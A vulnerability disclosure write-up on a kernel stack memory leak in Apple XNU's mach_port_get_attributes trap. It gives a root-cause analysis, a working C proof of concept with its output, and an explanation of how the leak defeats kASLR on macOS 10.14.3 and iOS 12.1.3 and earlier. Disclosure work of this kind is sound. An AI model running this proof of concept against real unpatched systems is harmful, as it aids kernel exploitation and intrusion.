---
layout: default
author: juwei lin
date: 2019-02-02 10:16:00 +0800
---

# Apple XNU Stack Memroy Leak 

## Overview
This is a kernel stack memory leak issue. This issue exists in function `_kernelrpc_mach_port_get_attributes_trap`.  

## Root Cause Analysis
In function `_kernelrpc_mach_port_get_attributes_trap`:  
```
int
_kernelrpc_mach_port_get_attributes_trap(struct _kernelrpc_mach_port_get_attributes_args *args)
{
    ...

    typeof(MACH_PORT_INFO_OUT[0]) info[max_count];  ---(1.a)

    ...

    rv = mach_port_get_attributes(task->itk_space, args->name, args->flavor, info, &count);
	if (rv == KERN_SUCCESS)
		rv = copyout(&count, CAST_USER_ADDR_T(args->count), sizeof(count));
	if (rv == KERN_SUCCESS && count > 0)
		rv = copyout(info, CAST_USER_ADDR_T(args->info), count * sizeof(info[0]));  ---(1.b)


}
```
At location 1.a, info is a local variable without initialization, max_count here is 17. At location 1.b, info is copied out back to user supplied buffer with size count * sizeof(info[0]).  

The issue here is that the value of `count` here can be 17 but `info` is just 11 count filled leaving the rest 6 count info entry leaked. Let's see the cause in function `mach_port_get_attributes`:   

```
kern_return_t
mach_port_get_attributes(
	ipc_space_t		space,
	mach_port_name_t	name,
	int			flavor,
        mach_port_info_t	info,
        mach_msg_type_number_t	*count)
{
    ...

    case MACH_PORT_INFO_EXT: {
		mach_port_info_ext_t *mp_info = (mach_port_info_ext_t *)info;   ---(2.a)
		if (*count < MACH_PORT_INFO_EXT_COUNT)
			return KERN_FAILURE;
			
		if (!MACH_PORT_VALID(name))
			return KERN_INVALID_RIGHT;
		
		kr = ipc_port_translate_receive(space, name, &port);
		if (kr != KERN_SUCCESS)
			return kr;
		/* port is locked and active */
		mach_port_get_status_helper(port, &mp_info->mpie_status);   ---(2.b)
		mp_info->mpie_boost_cnt = port->ip_impcount;    ---(2.c)
		*count = MACH_PORT_INFO_EXT_COUNT;  ---(2.d)
		ip_unlock(port);
		break;
	}

    ...
}
```

At 2.a, info is casted to structure `mach_port_info_ext_t`:  
```
typedef struct mach_port_info_ext {
	mach_port_status_t	mpie_status;
	mach_port_msgcount_t	mpie_boost_cnt;
	uint32_t		reserved[6];
} mach_port_info_ext_t;
```
At 2.b and 2.c, mpie_status and mpie_boost_cnt is set, at 2.d, count is set to MACH_PORT_INFO_EXT_COUNT(17). 17 here means 17 * sizeof(info[0]) bytes of info will be copyout back to user buffer, but mpie_status and mpie_boost_cnt total size is only 11 * sizeof(info[0]), it leaks the rest 6 count to user space.  
  
The leaked 6 count value includes an ebp register value. See the output of poc:  
```
kr: 0x0 count:17
i:0 0
i:1 0
i:2 1
i:3 5
i:4 0
i:5 0
i:6 1
i:7 0
i:8 0
i:9 0
i:10 0
i:11 ffffff80
i:12 28
i:13 0
i:14 25fb34e8
i:15 ffffff80
i:16 2a933ef0
```
The 15th and 16th value combination is always the current stack ebp value. Here is 0xffffff802a933ef0.  
If attacker can read (0xffffff802a933ef0+8) which is the function return address, it can defeat kASLR.  

## PoC Code
```
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach_port.h>
#include <mach/mach_init.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <mach/mach_traps.h>
#include <mach/mach_interface.h>


void poc() {
    int port_info[17]={0};
    mach_msg_type_number_t count = 17;
    mach_port_name_t port;
    kern_return_t kr;
    
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    
    kr = mach_port_get_attributes(mach_task_self(),port,7,port_info, &count);
    printf("kr: 0x%x count:%d\n", kr, count);
    
    for (int i=0; i<17; i++) {
        printf("i:%d %x\n", i, port_info[i]);
    }
    
}


int main(int argc, const char * argv[]) {
    poc();
    return 0;
}

```

## Q & A

### How did you find this vulnerability?
by code audit.

### Can you identify exploitability?
This is a **stack memory leak** vulnerability. It can help bypass kASLR.

### Can you identify root cause?
Yes, see the root cause analysis.

### Vulnerable software and hardware
macOS 10.14.3 and all before
iOS 12.1.3 and all before